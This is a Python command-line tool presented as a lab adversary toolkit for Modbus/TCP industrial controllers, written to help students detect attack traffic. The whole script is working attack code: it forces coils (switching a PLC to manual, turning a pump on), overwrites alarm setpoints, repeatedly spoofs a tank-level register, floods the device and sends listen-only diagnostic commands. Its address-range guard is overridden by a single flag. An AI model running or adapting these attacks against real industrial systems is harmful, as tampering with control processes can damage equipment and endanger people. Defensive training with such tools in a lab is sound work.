#!/usr/bin/env python3
"""OT-ICS lab adversary toolkit (Modbus/TCP). FOR THIS LAB ONLY.

A deliberately small, readable tool so you can see exactly which bytes each
technique puts on the wire - then go find them in Zeek, Suricata, Elastic and
Wireshark.

Safety rail: refuses any target outside 10.0.0.0/8 unless --i-own-this is set.

Examples (PLC = 10.N.40.10):
  ot_attack.py --target 10.N.40.10 read
  ot_attack.py --target 10.N.40.10 identify
  ot_attack.py --target 10.N.40.10 write-coil 2 0        # AUTO -> MANUAL
  ot_attack.py --target 10.N.40.10 write-coil 0 1        # force pump ON
  ot_attack.py --target 10.N.40.10 write-reg 1025 990    # raise HI setpoint
  ot_attack.py --target 10.N.40.10 spoof-level 300 --seconds 60
  ot_attack.py --target 10.N.40.10 flood --seconds 20
  ot_attack.py --target 10.N.40.10 diag 4                # FC8 force listen-only
"""
import argparse
import ipaddress
import struct
import sys
import time

from mbtcp import Client, ModbusError

COILS = ("pump_cmd", "drain_valve", "mode_auto", "high_alarm", "low_alarm")


def guard(target, override):
    ip = ipaddress.ip_address(target)
    if ip not in ipaddress.ip_network("10.0.0.0/8") and not override:
        sys.exit(f"refusing {target}: outside 10.0.0.0/8 lab space (use --i-own-this if you really do)")


def cmd_read(c, _a):
    coils = c.read_coils(0, len(COILS))
    regs = c.read_holding_registers(1024, 3)
    for name, val in zip(COILS, coils):
        print(f"  coil  {COILS.index(name)}  {name:<12} {val}")
    for i, (name, val) in enumerate(zip(("tank_level", "hi_setpoint", "lo_setpoint"), regs)):
        print(f"  hreg {1024 + i} {name:<12} {val}  ({val / 10:.1f} %)")


def cmd_identify(c, _a):
    for label, fn in (("FC17 Report Server ID", lambda: c.report_server_id()),
                      ("FC43/14 Read Device ID", lambda: c.raw(43, bytes([14, 1, 0])))):
        try:
            print(f"  {label}: {fn().hex()}")
        except ModbusError as exc:
            print(f"  {label}: {exc}")


def cmd_write_coil(c, a):
    c.write_coil(a.addr, bool(a.value))
    print(f"  wrote coil {a.addr} = {bool(a.value)}")


def cmd_write_reg(c, a):
    c.write_register(a.addr, a.value)
    print(f"  wrote holding register {a.addr} = {a.value}")


def cmd_spoof_level(c, a):
    """Race the field I/O: keep overwriting the level register (T0856)."""
    end = time.time() + a.seconds
    n = 0
    while time.time() < end:
        c.write_register(1024, a.value)
        n += 1
        time.sleep(a.interval)
    print(f"  sent {n} spoofed level writes ({a.value})")


def cmd_flood(c, a):
    end = time.time() + a.seconds
    n = 0
    while time.time() < end:
        try:
            c.read_holding_registers(0, 1)
        except (ModbusError, OSError):
            pass
        n += 1
    print(f"  sent {n} requests in {a.seconds}s")


def cmd_diag(c, a):
    try:
        print("  response:", c.raw(8, struct.pack(">HH", a.subfunction, 0)).hex())
    except ModbusError as exc:
        print("  exception (expected on OpenPLC - the attempt is what you detect):", exc)


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", required=True)
    ap.add_argument("--port", type=int, default=502)
    ap.add_argument("--unit", type=int, default=1)
    ap.add_argument("--i-own-this", action="store_true")
    sub = ap.add_subparsers(dest="cmd", required=True)
    sub.add_parser("read").set_defaults(fn=cmd_read)
    sub.add_parser("identify").set_defaults(fn=cmd_identify)
    p = sub.add_parser("write-coil")
    p.add_argument("addr", type=int)
    p.add_argument("value", type=int, choices=[0, 1])
    p.set_defaults(fn=cmd_write_coil)
    p = sub.add_parser("write-reg")
    p.add_argument("addr", type=int)
    p.add_argument("value", type=int)
    p.set_defaults(fn=cmd_write_reg)
    p = sub.add_parser("spoof-level")
    p.add_argument("value", type=int)
    p.add_argument("--seconds", type=float, default=60)
    p.add_argument("--interval", type=float, default=0.2)
    p.set_defaults(fn=cmd_spoof_level)
    p = sub.add_parser("flood")
    p.add_argument("--seconds", type=float, default=20)
    p.set_defaults(fn=cmd_flood)
    p = sub.add_parser("diag")
    p.add_argument("subfunction", type=int, help="1=restart comms, 4=force listen-only")
    p.set_defaults(fn=cmd_diag)
    a = ap.parse_args()

    guard(a.target, a.i_own_this)
    c = Client(a.target, a.port, a.unit)
    print(f"[{time.strftime('%H:%M:%S')}] {a.cmd} -> {a.target}:{a.port}")
    a.fn(c, a)
    c.close()


if __name__ == "__main__":
    main()
